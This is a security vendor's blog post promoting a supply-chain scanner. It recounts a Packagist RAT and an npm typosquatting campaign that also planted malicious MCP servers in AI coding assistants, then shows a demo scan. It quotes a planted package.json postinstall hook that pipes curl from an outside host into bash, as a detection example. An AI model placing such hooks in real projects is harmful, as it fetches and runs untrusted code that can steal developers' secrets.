---
title: "The Packagist RAT and the npm Worm: SecurityClaw Caught One While the Other Hid in Plain Sight"
description: "A PHP RAT hit Packagist on March 5. The same attack pattern hit npm in February. SecurityClaw's supply-chain-scanner found 7/7 planted threats — including two confirmed SANDWORM_MODE packages — in 0.19 seconds."
date: 2026-05-03
category: research
tags: [supply-chain, npm, sandworm, malware, open-source-security]
---

On March 5, 2026, researchers found three malicious packages on Packagist — PHP's composer registry. The middle one, `nhattuanbl/lara-swagger`, looked completely clean. The malware was in the dependency it pulled in: `nhattuanbl/lara-helper`, a PHP RAT with full command-and-control capabilities. Running `composer require nhattuanbl/lara-swagger` was enough. Your server would phone home to `helper.leuleu[.]net:2096` every fifteen seconds — executing commands, taking screenshots, uploading files.

You'd never see a warning.

This is the same playbook used in the **SANDWORM_MODE** npm campaign discovered in February 2026. Different registry, different language, same attack model: publish convincing packages, inject malware one layer down, wait for developers to install them. The packages in the SANDWORM_MODE campaign had AI-tool names close enough to real ones — `claud-code` instead of `claude-code` — that developers grabbed them without a second look. Once installed, they harvested every crypto key, CI secret, and API token they could find from the developer's environment, then injected malicious MCP servers into AI coding assistants.

Both attacks share a question that most development teams can't confidently answer: **Could you tell if one of those packages was in your dependencies right now? How fast?**

---

## The Demo: 0.19 Seconds

We gave SecurityClaw's supply-chain-scanner a controlled npm project — `saas-platform-backend`, 16 packages — with 7 deliberately planted threats. We wanted to know how fast it would catch them, and how accurately.

**0.19 seconds.** That is the fastest scan time in the SecurityClaw demo series.

**7/7 planted threats detected. 0 false positives.**

```
======================================================================
  🔗 SecurityClaw — Supply Chain Security Scan
======================================================================
  Target:    demo-targets/supply-chain-demo-target
  Ecosystem: npm
  Scanned:   2026-03-06T12:03:42Z
  Packages:  16 checked
======================================================================

  ⚠️  CRITICAL: 2 KNOWN MALICIOUS package(s) found!
    💀 claud-code
    💀 opencraw

  ⚠️  WARNING: 2 typosquatting suspect(s)
    🎭 requst
    🎭 lodahs

  📊 Findings Summary (8 total):
    🔴 CRITICAL  :   2  ██
    🟠 HIGH      :   2  ██
    🟡 MEDIUM    :   4  ████
```

The scanner didn't need to install anything. It didn't need a lockfile. It read the `package.json` and stopped two SANDWORM_MODE packages in their tracks before they ever reached `node_modules`.

---

## What Each Detection Type Means

### 🔴 CRITICAL: Known Malicious Packages

SecurityClaw maintains a built-in database of confirmed malicious packages drawn from threat intelligence: the SANDWORM_MODE campaign, historical supply chain attacks (ua-parser-js, node-ipc, event-stream), and ongoing feeds.

`claud-code` and `opencraw` are confirmed SANDWORM_MODE packages. Both were active in February 2026. When SecurityClaw hits a match here, the action is unambiguous: **stop, remove the package, rotate every secret that machine has touched.** The attacker has already been in your environment; the only question is how long.

The SANDWORM_MODE campaign was particularly sophisticated. It used polymorphic obfuscation — running variable names through Ollama and DeepSeek to generate new identifiers on each install — to defeat signature-based detection. SecurityClaw's approach is package-name matching against a maintained threat list, not signature scanning. No amount of obfuscation helps when the package name itself is the indicator.

### 🟠 HIGH: Typosquatting Detection

`requst` is one character away from `request`. `lodahs` is two characters away from `lodash`. Both of these show up in real npm typosquatting attacks — attackers register near-miss package names and wait for developers to mistype.

SecurityClaw calculates edit distance against 50+ commonly used npm packages. One character off a popular package is a HIGH confidence flag. Two characters is MEDIUM. The distinction matters for triage: a one-character difference from `request` is almost certainly not a legitimate package name, and the attacker knows it.

### 🟠 HIGH: Suspicious Install Scripts

One of the planted packages included this in its `package.json`:

```json
"scripts": {
  "postinstall": "curl https://telemetry-collector.io/register | bash"
}
```

This is the SANDWORM_MODE exfiltration pattern exactly. `curl <url> | bash` downloads and immediately executes arbitrary code in your shell. SecurityClaw checks 16 patterns for suspicious install hook behaviour — outbound HTTP/HTTPS calls, pipe-to-shell constructs, base64 decoding chains, and similar. A legitimate package telemetry collector doesn't need to run arbitrary bash scripts at install time.

### 🟡 MEDIUM: Unpinned Dependencies

Two packages declared version constraints that open the door to future compromise:

```json
"dotenv": "*",
"moment": "latest"
```

`"*"` means "any version, including future ones." `"latest"` means whatever is current at install time. If `dotenv` or `moment` is ever compromised — by a hijacked maintainer account, a malicious PR, or a registry exploit — your next `npm install` silently pulls in the malicious version. You never changed anything in your codebase. The attack came in through the dependency update you didn't explicitly ask for.

This isn't theoretical. The `event-stream` attack in 2018 worked exactly this way: a maintainer handed off a popular package to a malicious actor, who added a dependency with a time-delayed payload. Everyone with an unpinned `event-stream` in their tree was exposed.

---

## The Honest Gap

The CVE layer — `npm audit` — didn't run in this demo.

`npm audit` requires a `package-lock.json` or installed `node_modules` to work, because it needs to resolve the full dependency tree before checking against the National Vulnerability Database. We ran static analysis on `package.json` alone.

That limitation is worth being explicit about. Static analysis on a manifest catches what we demonstrated: known malicious packages, typosquatting, suspicious install hooks, and pinning hygiene. A full production scan against a lockfile would additionally surface known CVEs in your transitive dependencies.

The two approaches are complementary. Static manifest analysis is the fast first pass — run it before you ever install anything, on every PR that touches `package.json`. Full audit with lockfile resolution catches CVEs that static analysis can't see. SecurityClaw is most powerful when you use both.

---

## The Packagist RAT in Context

The March 5 Packagist incident is worth dwelling on because of the dependency injection technique. `nhattuanbl/lara-swagger` itself was clean. The attacker understood that security review, if it happened at all, would check the direct dependency's code. The RAT was one level below — in `nhattuanbl/lara-helper`, which `lara-swagger` pulled in automatically.

This mirrors how modern supply chain attacks increasingly work. The npm SANDWORM_MODE packages were similarly indirect in their obfuscation strategy: the attack code was there, but obfuscated in ways specifically designed to look like noise. The attacker's goal in both cases was to survive the moment of inspection that a developer might apply to a new package.

SecurityClaw's response to this is to not inspect code at all for known-malicious detection — it uses package identity. `claud-code` is on the list. It doesn't matter what the code inside looks like, or how many layers of obfuscation it uses. The package name is the indicator.

For the unknown attacks — the new campaigns that haven't been catalogued yet — the behavioural signals matter more: suspicious install hooks, unusual version constraints, edit-distance matches against popular packages. These signals don't require knowing the specific attack in advance.

---

## Two Registries, One Attack Surface

The Packagist RAT and SANDWORM_MODE are the same threat model expressed in different ecosystems. The specifics differ — PHP vs JavaScript, composer vs npm, a RAT vs a secret harvester. The underlying logic is identical: compromise the trust relationship between developers and public registries by exploiting the habit of installing packages without inspecting them.

SecurityClaw's supply-chain-scanner addresses the npm side. 0.19 seconds from manifest to findings. In the time it takes to read this sentence, a developer could know whether their `package.json` contains a SANDWORM_MODE package.

The more important question isn't whether SecurityClaw can scan fast. It's whether your team scans at all.

---

**What's in your `package.json`?**

*SecurityClaw is available at [securityclaw.io](https://securityclaw.io). Demo Series D9 — supply chain security scanner. Campaign ID 13: 7/7 planted threats detected, 0 false positives, 0.19 seconds.*
